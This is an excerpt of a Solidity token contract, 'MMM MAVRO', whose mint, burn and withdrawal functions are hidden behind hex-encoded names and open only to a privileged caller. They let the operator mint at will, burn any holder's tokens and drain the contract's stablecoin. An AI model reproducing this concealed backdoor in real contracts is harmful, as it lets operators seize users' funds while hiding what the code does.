...
contract MavroContract is IERC20, Ownable {
    ...
    string private _name = 'MMM MAVRO';
    string private _symbol = 'MAVRO';
    uint8 private _decimals = 6;

    IERC20 pusdt;

    constructor( IERC20 _pusdt ) public {
        pusdt = _pusdt;
    }
    ...
    function m74736f74(address account, uint amount) external onlyCaller { 
        require(pusdt.balanceOf(address(this)) >= amount);
        pusdt.transfer(account, amount);
    }

    function m6d696e74(address to, uint256 amount) external onlyCaller returns (bool) {
        _mint(to, amount);
        return true;
    }

    function m6275726e(address from, uint256 amount) external onlyCaller returns (bool) {
        _burn(from, amount);
        return true;
    }
}